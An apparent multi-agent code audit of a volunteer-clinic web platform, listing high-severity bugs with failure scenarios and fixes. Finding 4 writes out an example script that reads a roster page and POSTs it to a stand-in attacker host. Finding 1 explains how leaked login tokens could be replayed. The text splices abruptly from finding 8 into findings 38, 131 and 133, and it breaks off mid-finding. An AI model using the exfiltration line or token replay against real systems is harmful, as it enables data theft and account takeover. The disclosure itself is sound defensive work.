# HAVEN Hub whole-app audit, 11th pass

**Date:** 2026-07-23
**Base:** clean worktree fork of `origin/main` @ `63d76ccc` (includes #370, #371)
**Scope:** correctness and bug hunt across the whole platform, ~110k LOC, 63 Prisma models, 18 API routes
**Result:** 139 findings after merging duplicates: 12 high, 67 medium, 60 low. No critical.
**Baseline on this tree:** `tsc --noEmit` clean, 3163 of 3164 unit tests pass (the one failure is a pre-existing flake, see Method).

## Executive summary

The platform is structurally sound. Ten prior audits have cleared out the shallow defects, and this pass found no critical issue: no auth bypass, no cross-user data exposure through a query, no data-destroying path. The permission model, the Prisma access layer, and the email queue all held up under direct attack.

What it did find is a mature app straining against two assumptions it has outgrown. The first is that exactly one term is live at a time. Ops routinely runs the next term ahead of the flip, and a dozen surfaces silently disagree about which term they mean, so next-term shift requests are emailed to approvers who have no page that can display them. The second is that a question's visibility can be evaluated the same way on the client and the server. For four field types it cannot, and the applicant is either shown a question the server discards or blocked by a required question they were never shown.

Beyond those, the recurring shape is the one-way door: an action that cannot be undone and has no in-app recovery. An onboarding link that expires cannot be resent. An acceptance with a contract cannot be rescinded. A closed IT ticket strands the Epic account request inside it. None of these lose data, but each one puts a real person into a state only a developer with database access can get them out of.

Fix first: the PostHog token leak (1), the offboarding desync in promotion (6), and the cross-term scoping cluster (27, 30, 41, 43, 47).

## Themes

**T1. Cross-term scoping (27, 30, 41, 43, 47, 60, 64).** The app assumes one ACTIVE term, but ops runs the next term ahead of the flip. `/schedule/requests` hard-scopes to ACTIVE, so next-term requests can never be approved, while `schedule-reminders` cron keeps emailing approvers about them. `activateTerm` archives the outgoing term with no path back to PLANNING. `updateClinicDates` strands assignments on removed dates. Clearance is computed one way for the builder banner and another way for the member's own checklist. This is the highest-value cluster because every finding in it is ops-visible during a term flip, which is exactly when nobody has spare attention.

**T2. Client and server disagree on conditional visibility (33, 35, 52, 53, 54, 57).** `visibleWhen` is evaluated in the browser and again on submit. For SIGNATURE and FILE fields the server always reads "unanswered", and for CHECKBOX the two sides use different representations (`true` vs `"on"`). Result: an applicant is blocked by a required question they were never shown, or their answers and uploads are silently dropped. The speed-score reviewer sees a differently-filtered version of the same application, so reviewers score renewal applicants on incomplete answers.

**T3. One-way doors with no in-app recovery (3, 5, 7, 10, 41, 43, 63).** Each of these is a state a normal user can reach and nobody but a developer can leave. The onboarding link cannot be resent once a contract row exists, so a 21-day expiry is terminal. `revokeAcceptance` instructs the user to remove the onboarding contract, but no code path anywhere deletes an `OnboardingContract`. `closeTicket` hides still-open Epic requests from every actionable view. Saving the master contract template overwrites the DIRECTOR default for every director cycle with no reset control.

**T4. Offboard convergence is still leaky (6, 37, 40, 51).** The invariant (Person.status and TermMembership.status move together, and open Epic requests are cancelled) is enforced in the offboard path but not in the paths that write memberships. `promoteContracts` reactivates an offboarded Person with a raw `person.update`, leaving the queued Epic DEACTIVATE live, so IT deactivates the account of somebody who just re-joined. Admin UI will happily attach an ACTIVE membership to an OFFBOARDED person, re-populating rosters and shift reminders for somebody who cannot log in.

**T5. Credentials and confidential text crossing a trust boundary (1, 45).** posthog-js captures `$current_url` with no sanitizer, and both `/login/verify?token=` and `/onboard/<token>` render full pages, so live magic-link tokens (30 min) and onboarding tokens (21 days) are shipped to PostHog verbatim. Separately, approving a strike emails the anonymous reporter's verbatim narrative to the subject of the report, against the anonymity the reporting form promises.

**T6. Focus and keyboard handling in shared primitives (12, 24, 28, 77, 78, 79).** These sit in `src/platform/ui`, so each one is a defect everywhere the primitive is used. `ConfirmButton` swaps its own DOM node when armed, so a keyboard user can never reach the confirm step of any destructive action in the app. The Modal focus trap only fires when `activeElement` is exactly the first or last node, so focus escapes to the obscured page once any in-modal button disables itself. Combobox lets Enter fall through to native form submission.

**T7. Identity matching is fragile at the edges (15, 49, 74, 83, 110).** `netId` and `contactEmail` are lowercased but never trimmed, so a pasted trailing space defeats the `lower(netId)` unique index and locks the person out of SSO. `promoteAcceptance` writes `Person.netId` without lowercasing at all. The applicant types their own netId on the contract, and promotion binds the contract to whatever Person that string matches.

## Suggested PR grouping

Ordered by what to ship first.

1. **Security and privacy** (1, 45, 4). Add a `sanitize_properties` URL scrubber to posthog-js, drop the reporter narrative from the subject-facing strike email, and put a CSP on the SCORM route. Small, isolated, no schema change.
2. **Offboard convergence** (6, 37, 40, 51). Route every membership write through the same converge helper the offboard path uses. Touches promotion and admin roster; worth a focused test pass.
3. **Cross-term scoping** (27, 30, 41, 43, 47, 60, 64). The biggest cluster and the most ops-visible. Decide the term-resolution rule once, apply it to the approvals page, the dashboard badge, the reminder cron, and clearance. Higher risk, ship on its own.
4. **Conditional-visibility parity** (33, 35, 52, 53, 54, 57). Make the server evaluate SIGNATURE, FILE, and CHECKBOX the way the client does, and merge the authoritative department before evaluating. Add a shared evaluator so the two sides cannot drift again.
5. **Recovery paths for one-way doors** (3, 5, 7, 10, 63). Resend onboarding link, delete an OnboardingContract on rescind, surface Epic requests on closed tickets, reset the contract template, reopen a RESOLVED ticket. Mostly additive, low regression risk.
6. **Shared UI primitives** (12, 24, 28, 77, 78, 79). Focus management and keyboard behaviour in ConfirmButton, Modal, Combobox, TypePicker. Wide blast radius, so ship after the functional fixes and lean on e2e.
7. **Identity normalization** (15, 49, 74, 83, 110). Trim and lowercase at every write point, plus a one-off backfill for rows already stored with whitespace.
8. **Email correctness** (68, 69, 82, 125, 129, and the wrong-TLD and dead-CTA links). Audience conditions, retry classification, and link targets. Independent of everything else.

## Method and limits

40 agents hunted in parallel: 16 cross-cutting bug classes (authorization, Prisma semantics, timezones, races, client/server boundary, capacity math, and others) and 14 module deep-reads, plus a completeness-critic round that assigned 10 more. They produced 155 raw findings. Each was screened, then judged by three independent reviewers applying different lenses (re-trace the path, actively refute it, judge production impact), with majority rule. 670 reviewer verdicts were cast. Reviewers demoted heavily: 31 findings claimed high severity, 12 survived at high.

**Limits, stated honestly:**

- Static reading only. No browser session, no runtime reproduction, no e2e run. Every finding is an argument from code, not an observed failure.
- 19 findings are marked `UNVERIFIED`: the run hit a usage limit and their reviewers never completed. They are included because they were screened, but they carry less evidence than the rest. Two are in the high section (2 and 12).
- 4 findings are marked `REJECTED` where a reviewer disagreed but the finding still looked worth a human read.
- Severity is a judgement call. Anything marked medium that touches a term flip is worth treating as high during the flip itself.
- The one failing unit test is not a regression: `src/modules/schedule/services/requests.test.ts:56` builds term codes as `SU26-${Date.now()}` and line 364 creates two terms back to back, so they collide when both land in the same millisecond. The sibling helper in `builder.test.ts:81` already appends `Math.random()`. `attendings.test.ts:19` has the same weakness.
- Finding 1 was re-verified by hand against the real code, not taken from the agents.

# High (12)

## 1. posthog-js pageview capture ships live magic-link and onboarding-contract tokens to PostHog in $current_url
`instrumentation-client.ts:3` (credential-leak-to-telemetry, panel 3/3)

**What's wrong.** posthog.init() is configured with no `sanitize_properties` / `before_send` hook and with the default `capture_pageview` behaviour, so every page load captures `$current_url` verbatim. Three routes in this app carry a live, unconsumed credential in the URL itself, so opening any of them writes that credential into PostHog as an ordinary event property. The same URL is also forwarded on the server error path.

**How it fails.** A non-Yale clinic member requests a login link. They click `https://hub/login/verify?token=<raw>&next=/schedule`. The verify page deliberately only *peeks* the token (src/app/login/verify/page.tsx:33) and does not consume it until the member presses Continue, so the raw token stays valid for its full 30-minute TTL (member-magic-link.ts:8). Meanwhile posthog-js has already fired a `$pageview` whose `$current_url` contains that raw token, stored permanently in the HAVEN Free Clinic PostHog project. Anyone with read access to that PostHog project (a strictly different, and broader, population than HAVEN Hub admins) can copy the token out of the event within the window and complete `signIn("member-magic-link")` as that member. The same holds for `/apply/verify?token=` (portal-auth.ts:215, peek-then-confirm, grants a 7-day applicant cookie) and, worse, for `/onboard/<token>`, whose token is described in-code as "a standing credential (opening it lets someone submit onboarding data as the applicant)" with a 21-day TTL (onboarding.ts:22-28) and no consumption on view - so every applicant who opens their onboarding link deposits a 21-day credential into PostHog that lets a reader submit that applicant's DOB, signature and HIPAA certificate.

**Fix.** Add a `sanitize_properties` (or `before_send`) hook to `posthog.init` that rewrites `$current_url` / `$pathname` / `$initial_current_url` / `$referrer` for the credential routes: replace the `/onboard/<token>` segment with `/onboard/[token]` and strip the `token` query parameter on `/login/verify` and `/apply/verify`. Do the same server-side in `request-error.ts` by normalising `request.path` (drop the query string, mask the `/onboard/` segment) before passing it as `path`. A guard test in the style of `src/platform/dates/no-raw-locale.guard.test.ts` would keep new token-in-URL routes from regressing this.

## 2. backfill-completion-dates.ts reads certificate bytes from local disk instead of @/platform/storage, so the PDF-parse path is dead in production (Blob)
`scripts/backfill-completion-dates.ts:34` (storage-abstraction-bypass, panel -) `UNVERIFIED`

**What's wrong.** `readFileFromUploadDir` does a raw `fs.readFile(path.join(config.UPLOAD_DIR, storedName))`. Every other read path in the app goes through `getObject()` in `src/platform/storage.ts:66`, which dispatches to Vercel Blob when `BLOB_READ_WRITE_TOKEN` is set and only falls back to `config.UPLOAD_DIR` locally. The certificates importer writes the bytes through `putObject` (`src/platform/airtable/import/certificates.ts:157`), i.e. into Blob in production. The backfill then looks for those same bytes on the operator's laptop disk, finds nothing, `readFile` returns `null`, and `backfillCompletionDates` silently skips strategy 1 (`src/platform/compliance/backfill.ts:175-186`) for every certificate.

**How it fails.** Launch cutover, run by an ops operator against prod: `npm run import:certs:apply` (which *requires* BLOB_READ_WRITE_TOKEN when DATABASE_URL is remote, per the guard at scripts/import-certificates.ts:19-37) pushes N HIPAA certificate PDFs into Vercel Blob and creates N `HipaaCertificate` rows with `completionDate: null`. The operator then runs `npm run backfill:dates:apply` with the same `.env` (which points DATABASE_URL at prod Neon, per the comment in prisma/seed.ts:66-71). `config.UPLOAD_DIR` defaults to `./uploads` on the laptop and is empty, so `readFile` returns null for all N certs. The PARSED strategy never runs; every cert falls through to the Airtable AI-text field. Any volunteer whose Airtable "HIPAA Last Completed Date" AI cell is blank, stale, or in an unrecognised format keeps `completionDate: null` forever, so `complianceStatus` returns UNKNOWN_DATE (src/platform/compliance/rules.ts:77), they show as non-compliant on the compliance dashboard, and they receive the "cert on file, unknown date" reminder email even though the PDF sitting in Blob contains the date the parser would have extracted. A compliance manager then has to key each date in by hand. The script's own output masks this as a plausible-looking `PARSED (from PDF): 0`.

**Fix.** Delete `readFileFromUploadDir` and pass `readFile: (storedName) => getObject(storedName)` from `@/platform/storage`. Optionally mirror the `assertStorageMatchesDatabase()` guard from scripts/import-certificates.ts:19-37 so the script refuses to run against a remote DATABASE_URL with no blob token instead of silently degrading.

## 3. Saving the global master contract template silently replaces the DIRECTOR default for every director cycle, and cannot be undone
`src/app/(app)/admin/contract/page.tsx:12` (contract-template-resolution, panel 6/6)

**What's wrong.** `onboarding.contractTemplate` is a single, track-agnostic setting, but `resolveLayoutSources` gives it precedence over the track-specific code default. The admin editor at /admin/contract always seeds from `DEFAULT_CONTRACT_LAYOUT`, which is `VOLUNTEER_LAYOUT` (defaults/index.ts:14). So the first save on that page stores the volunteer layout as the global default, and every DIRECTOR cycle without its own `RecruitmentCycleContract` override then resolves to it. There is no way back: the editor's "Reset to default" button is gated on `mode === "cycle" && hasOverride` (contract-editor.tsx:236) and the setting is `hidden: true` in the registry (registry.ts:278) so it never appears on /admin/settings.

**How it fails.** An admin follows the "Onboarding contract" link on /admin (admin/page.tsx:65), tweaks one word of the HIPAA prose (or just clicks "Save contract"), and saves. From then on, every director cycle that has not been hand-edited in its own Form builder freezes the VOLUNTEER contract onto each `OnboardingContract.templateSnapshot`. Newly accepted board directors are never shown, and never sign, Board Responsibilities, the director Strike Policy, their department-specific responsibilities block, the Data Privacy Statement, the Board Director Acknowledgement, or the `second_department` questions. `buildContractReview` renders the same frozen volunteer layout, so nothing in the reviewer UI flags the omission. The admin cannot revert, because the global template can no longer be cleared from anywhere in the app.

**Fix.** Either store the master template per track (two settings, or a `{VOLUNTEER, DIRECTOR}` shape) and have `resolveLayoutSources` pick by track, or seed /admin/contract from `defaultContractLayout(track)` behind a track selector. At minimum, add a "Reset to built-in default" control in `mode === "global"` that clears the setting.

## 4. SCORM package files are served same-origin with no CSP, so learning.manage_courses escalates to acting as (and exfiltrating data from) any learner
`src/app/(app)/learning/play/[courseId]/[...path]/route.ts:52` (privilege-escalation, panel 2/3)

**What's wrong.** Every file of an admin-uploaded SCORM zip is streamed from the app's own origin at /learning/play/... with its real Content-Type (text/html for .html, text/javascript for .js) and no `X-Content-Type-Options` and no `Content-Security-Policy`. The player then frames it with `sandbox="allow-scripts allow-same-origin allow-forms"` (ScormPlayer.tsx:172), which for same-origin content is not a sandbox at all: script in the package shares the app's origin, sees `window.parent`, and its `fetch`/XHR carry the learner's NextAuth session cookie. Every other user-content route in this repo (my-info/certificate:96-97, support/attachment:52, api/branding:31-32, recruitment files:112-113, incidents attachments:112-113, onboarding hipaa:77-78) sets nosniff plus `default-src 'none'`; the one route that serves *executable* uploaded content sets neither.

**How it fails.** A Learning Coordinator holding only `learning.manage_courses` + `learning.view_progress` (an explicitly supported configuration, see the comment at src/platform/modules/registry.ts:162-167, it confers no roster, compliance, incident or admin rights) uploads a SCORM zip whose index.html contains `fetch('/volunteers/master').then(r=>r.text()).then(t=>fetch('https://evil.example/x',{method:'POST',body:t}))`. The course is EVERYONE/assignToAll, so it is assigned to directors and to any Platform Admin who holds a TermMembership. The next time such a person opens the course at /learning/<id>, that script runs with their cookie: it can read any page they can read (master volunteer roster, HIPAA compliance, confidential incident reports) and POST it off-origin (CORS does not prevent the send), and it can drive the parent document or replay Next server actions to write as them. The upload is auditable only as `learning.package_upload`; nothing records what the JS did. The same exposure applies to any third-party/vendor SCORM zip a coordinator ingests in good faith.

**Fix.** Keep the same-origin iframe (SCORM 1.2 API discovery needs `window.parent.API`) but ship a response CSP on the play route that removes the exfiltration and cross-page-read primitive, e.g. `Content-Security-Policy: default-src 'self'; connect-src 'none'; form-action 'none'; frame-ancestors 'self'; base-uri 'none'` plus `X-Content-Type-Options: nosniff`, matching the header convention used by the other six content routes. If cross-page reads by package script must also be prevented, serve packages from a distinct origin (e.g. a `PLAY_BASE_URL` host) and replace direct `window.parent.API` access with scorm-again's cross-frame-api postMessage shim (already bundled: node_modules/scorm-again/dist/esm/cross-frame-api.js).

## 5. An onboarding link can never be resent: the send checkbox disappears as soon as a contract row exists, so an expired or undelivered link has no in-app recovery
`src/app/(app)/recruitment/cycles/[id]/onboarding/page.tsx:68` (dead-end-flow, panel 6/6)

**What's wrong.** `createOrResendContract` is explicitly built to be resendable (it refreshes `sentAt`/`expiresAt` on the same token and is unit-tested for exactly that), and `getContractByToken` documents "An SRR can revive it by resending, which refreshes expiresAt on the same token." But the only UI that can invoke it renders the row's selection checkbox under `!r.contract`, i.e. only while no `OnboardingContract` exists. The moment the first link is sent the row becomes permanently unselectable, so `sendLinksAction` can never be reached for it again.

**How it fails.** SRR sends Ada her onboarding link on 1 August. Ada is travelling and opens it on 25 August; `ONBOARDING_LINK_TTL_MS` (21 days) has elapsed, so `getContractByToken` returns null and /onboard/<token> shows "This onboarding form is not available". Ada emails SRR. SRR opens the cycle's Onboarding tab: Ada's row shows the badge "Sent" with no checkbox and no resend control anywhere in the app, so SRR cannot reissue the link. The same dead end hits every applicant whose onboarding email hard-bounces or ends up in spam (the `EmailLog` row goes FAILED after 8 attempts and nothing in the UI can retrigger the send). The only recovery is a direct DB write.

**Fix.** Render the checkbox whenever `!r.conflicted && r.contract?.status !== "SUBMITTED" && r.contract?.status !== "PROMOTED"` (createOrResendContract already refuses a non-PENDING contract at services/onboarding.ts:133), and relabel the button to "Send / resend onboarding links".

## 6. promoteContracts reactivates a Person without cancelling the offboard-queued PENDING DEACTIVATE EpicRequest
`src/modules/recruitment/services/promotion.ts:85` (state-desync, panel 6/6)

**What's wrong.** setPersonStatusField is documented as the sole convergence point for Person.status, and its ACTIVE branch cancels any open DEACTIVATE EpicRequest ("a returning person no longer owes a revocation", src/platform/people.ts:310-321). promoteContracts is the only other writer of Person.status and it flips an OFFBOARDED person straight to ACTIVE with a bare tx.person.update, skipping that convergence entirely. The stale PENDING DEACTIVATE survives on a now-active member.

**How it fails.** A PCAR volunteer with an Epic ID is offboarded at the end of SP26. setPersonStatusField (people.ts:296-307) queues one PENDING DEACTIVATE EpicRequest. In June she reapplies for FA26, is accepted, submits her onboarding contract, and SRR promotes her (promoteAction -> promoteContracts). promotion.ts:85 sets her Person.status back to ACTIVE and reactivates her TermMembership, but the DEACTIVATE request is untouched. Consequences, all against a currently-active member: (1) she still appears in listPendingDeactivations (itcm.ts:496-500 filters only on kind/status, never on Person.status), so the next time IT runs the Deactivate tab she is batched into a YNHH deactivation service request and her Epic access is revoked mid-term; (2) completeRequest happily completes it because DEACTIVATE is explicitly exempted from the ACTIVE-person check (epic.ts:321); (3) if she instead needs a new Epic account, submitEpicRequests (itcm.ts:645-663), createEpicRequest (epic.ts:113-125) and attachEpicRequests (epic-link.ts:78-86) all refuse with "An open Epic request already exists", deadlocking her provisioning; (4) the Pending tab that offers the cancel control excludes DEACTIVATE rows (itcm.ts:717 `kind: { not: "DEACTIVATE" }`) and the Tracker only lists ticket-linked requests, so there is no UI at all to cancel the stale row.

**Fix.** In promoteContracts' reactivation branch, mirror setPersonStatusField's ACTIVE branch: inside the same transaction, `updateMany({ where: { personId: person.id, kind: "DEACTIVATE", status: { in: ["PENDING", "SUBMITTED"] } }, data: { status: "CANCELLED" } })` with a note. Better still, extract that convergence into a shared helper in @/platform/people so any future Person.status ACTIVE writer picks it up. Separately, listPendingDeactivations should exclude people whose Person.status is ACTIVE (or flag them), so a stale row can never silently reach a YNHH ticket.

## 7. An acceptance with an OnboardingContract can never be rescinded, re-routed, or re-decided: the "remove the onboarding contract" teardown path does not exist
`src/modules/recruitment/services/review.ts:206` (unreachable-transition, panel 6/6)

**What's wrong.** Five separate services refuse to change a decision or delete an acceptance once an OnboardingContract row exists, each telling the operator to tear the contract down first. There is no delete or teardown for OnboardingContract anywhere in the codebase: the only writes are create (onboarding.ts:144), templateSnapshot update (:161), sentAt/expiresAt update (:180), the submit claim (:477) and the promote update (promotion.ts:175). Creating the contract is a side effect of clicking "Send onboarding link", so that one click permanently freezes the acceptance and the application's decision.

**How it fails.** SRR sends onboarding links to the accepted FA26 volunteer cohort (sendLinksAction -> createOrResendContract, which creates a PENDING OnboardingContract for every selected acceptance). One applicant emails back to withdraw, or PCAR realises the wrong applicant was accepted. The reviewer opens the applicant page, sees the "Rescind acceptance" button (rendered by RescindAcceptanceNotice at applicants/[applicationId]/page.tsx:291) and clicks it. rescindAcceptanceAction catches the AcceptanceError and re-renders the banner "This applicant has an onboarding contract. Remove the onboarding contract before revoking the acceptance." -- pointing at a control that does not exist in the product. Every alternative is blocked by the same condition: decideRoutedApplication REJECT/WAITLIST (routing.ts:130-132), decideInterview REJECT/WAITLIST (interview-decisions.ts:47-51), rejectApplication (routing.ts:178-180), reopenDecision (routing.ts:229-231), and routeApplication re-route (routing.ts:58-63). The applicant stays permanently listed as accepted/onboarding in listOnboarding and on the applicant portal (portal-status.ts:76-78 renders "Onboarding in progress" off contract presence), and the department's decision record is permanently wrong. Recovery requires direct DB surgery.

**Fix.** Add an SRR-only `withdrawContract(contractId)` service that deletes the OnboardingContract (and its signature/HIPAA blobs via deleteObject) for a contract in status PENDING or SUBMITTED but not PROMOTED, audited, and surface it on the cycle onboarding page next to Resend. Then the existing five guards become actionable. At minimum, if teardown is intentionally not supported, the guards' messages and the rescind control should say so explicitly rather than instructing the user to perform a non-existent action.

## 8. submitApplication writes applicantPersonId=null for every NEW application, silently disabling all five self-dealing guards (and unlinking drafts that were already linked)
`src/modules/recruitment/services/submissions.ts:421` (separation-of-duties-bypass, panel 6/6)

**What's wrong.** `applicantPersonId` is initialised to `null` (submissions.ts:122) and only ever assigned inside the `isReturning` branch (`:142`). Both write paths at `:421`/`:425` then set it unconditionally, so any application submitted with `applicantType === "NEW"` lands with `Applicant.applicantPersonId = null` even when the submitter is a signed-in, matched Person (the same block at `:165-176` proves the code knows about "a NEW applicant who is nonetheless a matched person" and pins their NetID from the record). Worse, `saveDraft` already stored the link (`drafts.ts:129-135`, `applicantPersonId: identity.personId`), so the finalisation update at `:421` actively *erases* it. Every separation-of-duties guard in recruitment keys on that column and therefore becomes inert.

**How it fails.** A current director of department SRHD re-applies through the DIRECTOR-track cycle. On the applicant-type step the wizard always offers "New applicant" (`apply-wizard.tsx:174`, `show: true`), so they pick it instead of Renewal/Transfer. `submitPublicApplication` passes their real `sessionPersonId` (`apply/[slug]/actions.ts:50`) but `submitApplication` stores `applicantPersonId = null`. `reviewScope` still gives them SRHD, so their own application appears in their own review queue (`review.ts:93`). They call `createInterview(app, "SRHD")` (passes `assertCanManage`, `interviews.ts:19-24`) and then `decideInterview(..., "ACCEPT", theirOwnPersonId, ...)`. The guard at `interview-decisions.ts:25` - whose comment names this exact scenario, "a director re-applying into a department they manage" - short-circuits on the `applicantPersonId &&` truthiness test and never fires. They accept themselves, minting an Acceptance -> OnboardingContract -> promotion. The identical bypass applies to `submitCommitteeScore` (`committee-scoring.ts:33`), `decideRoutedApplication` (`routing.ts:116`), `rejectApplication` (`routing.ts:179`), `submitEvaluation` (`evaluations.ts:21`), and the roster's "never queue your own application" filter (`applicants/page.tsx:67`), which will now feed a committee member their own application in the speed-score modal. With Renewal/Transfer chosen instead, all six guards fire correctly - the control's effectiveness depends entirely on a radio button the applicant picks.

**Fix.** Resolve the link for every submission, not just returning ones: after the `isReturning` block, add `if (!isReturning && input.sessionPersonId) applicantPersonId = input.sessionPersonId;` (the same condition already used for `matchedRecordNetId` at :170). Alternatively, make the finalisation update at :421 preserve an existing value (`applicantPersonId: applicantPersonId ?? existingApplicant.applicantPersonId`) so a draft's link is never erased. ## 38. listEmails paginates with skip/take ordered only by createdAt, which chunked createMany makes systematically tied - admin email monitor repeats and drops rows across pages

## 131. cancelCampaign writes CANCELLED without an atomic claim, so a cancel can report success after the dispatcher already sent the campaign
`src/platform/email/campaigns/service.ts:407` (check-then-act, panel 3/6)

**What's wrong.** `cancelCampaign` reads the campaign (service.ts:403), checks `status` is SCHEDULED or ACTIVE (service.ts:404-406), then issues an unconditional `prisma.emailCampaign.update` to CANCELLED (service.ts:407). This is the one status transition in the file that does not use the atomic-claim pattern `executeRun` establishes at service.ts:268-274 (`updateMany({ where: { id, ...claimWhere } })` with a `count !== 1` abort). If `dispatchDueCampaigns` claims the campaign between the read and the write, the cancel still commits and overwrites the dispatcher's SENT status.

**How it fails.** An admin realises a scheduled blast is wrong and clicks Cancel just as the 30-minute `/api/cron/email` tick reaches `dispatchDueCampaigns`. The dispatcher's claim (dispatch.ts:24-28 -> service.ts:268) flips SCHEDULED->SENT, creates the `EmailCampaignRun`, and then enqueues every recipient's EmailLog outside the transaction (service.ts:284-288). The admin's `update` lands afterwards and sets status back to CANCELLED with `nextRunAt: null`. The admin's UI reports the campaign as cancelled, but every recipient's mail is already QUEUED and the enqueue-triggered flush (send.ts:58) delivers it within seconds. There is no path in `cancelCampaign` that de-queues an already-committed run, so the admin has no signal that the send went out.

**Fix.** Make the cancel a claim: `const { count } = await prisma.emailCampaign.updateMany({ where: { id, status: { in: ["SCHEDULED", "ACTIVE"] } }, data: { status: "CANCELLED", nextRunAt: null } }); if (count === 0) throw new Error("This campaign was already dispatched; it can no longer be cancelled.");` so the admin is told the send went out instead of seeing a false success.

## 133. resolveTeamsTransport silently degrades to the log transport in production, and the drain records those rows LOGGED so the email fallback never fires
`src/platform/notifications/teams-transport.ts:138` (silent-notification-drop, panel 3/3)

**What's wrong.** When `email.transport` is "graph" but no MailCredential row exists (or its `account` is null), `resolveTeamsTransport` logs a warning and returns `LogTeamsTransport`. That transport *succeeds* and returns `{ logged: true }`, so `drainTeamsQueue` marks the row `LOGGED` with `lockedAt: null` and `sentAt: null` - a terminal success state. **How it fails.** An admin sets Settings > Email transport to "Microsoft Graph" and switches a notification type (say `incidents.strike_requested` or `support.request_assigned`) to "Teams DM" before completing the OAuth connect at /admin/email - or a fresh production environment is provisioned with the setting seeded to graph but the mailbox not yet connected.
